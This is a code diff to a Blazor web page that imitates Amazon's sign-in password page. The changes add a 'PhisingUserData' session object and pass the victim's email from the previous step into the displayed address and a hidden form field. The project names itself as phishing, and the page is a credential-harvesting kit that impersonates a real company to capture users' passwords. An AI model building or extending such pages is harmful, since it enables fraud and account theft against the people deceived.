@@ -1,9 +1,13 @@
-﻿@page "/amz/Signin/{mail}"
+﻿@page "/amz/Signin"
 @layout AmzLayout
 
-@inject Microsoft.AspNetCore.Components.NavigationManager navigationManager
-
-<head>
+@if(mail == null)
+{
+<p>Loading...</p>
+}
+else
+    {
+        <head>
         <meta charset="utf-8">
         <title dir="ltr">Amazon Sign In</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
@@ -73,7 +77,7 @@
                         <div class="a-section a-spacing-base">
                             <div class="a-section">
                                 <div id="zwimel" class="zwimel" style="display:none;"></div>
-                                <form name="signinpass" id="signinpass" method="post" action="" class="auth-validate-form auth-real-time-validation a-spacing-none fwcim-form">
+                                <form name="signinpass" id="signinpass" method="" action="" class="auth-validate-form auth-real-time-validation a-spacing-none fwcim-form">
 
                                     <div class="a-section">
                                         <div class="a-box">
@@ -84,8 +88,8 @@
                                                 <!-- optional subheading element -->
 
                                                 <div class="a-row a-spacing-base">
-                                                    <span>cocatoj886@cocyo.com</span>
-                                                    <a class="a-link-normal" tabindex="6" href="#">
+                                                    <span>@mail</span>
+                                                    <a class="a-link-normal" >
             Change
           </a>
                                                 </div>
@@ -121,7 +125,7 @@
 
                                                 </div>
 
-                                                <input type="hidden" name="emaill" value=" cocatoj886@cocyo.com" />
+                                                <input type="hidden" name="emaill" value="@mail" />
 
                                                 <div class="a-section">
                                                     <span class="a-button a-button-span12 a-button-primary" id="a-autoid-0"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" type="submit" aria-labelledby="a-autoid-0-announce"><span class="a-button-text" aria-hidden="true" id="a-autoid-0-announce">
@@ -220,23 +224,31 @@
         <div id="a-popover-root" style="z-index:-1;position:absolute;"></div>
         <div class="fwcim-container"></div>
     </body>
-
-@code {
-    private int currentCount = 0;
-
-    private void IncrementCount()
-    {
     }
 
-    [Parameter]
-    public string Mail{ get; set; }
 
-    protected override void OnParametersSet()
-{
-    //the param will be set now
-    var test = Mail;
 
-    Console.WriteLine(test);
-}
+    
+@using BlazorApp.Data 
 
+@inject NavigationManager navigationManager
+@inject Blazored.SessionStorage.ISessionStorageService _session
+
+
+@code {
+    public string mail = "";
+
+    private readonly ILogger _logger;
+    private PhisingUserData userData;
+
+    //protected async override Task OnParametersSetAsync()
+    //{
+
+    //    //     //set mail to user mail from privius page
+    //    //    userData = await _session.GetItemAsync<PhisingUserData>("SessionUser");
+    //    mail = "lolol@gmail.com";//userData.Email;
+
+    //}
+    
+    
 }
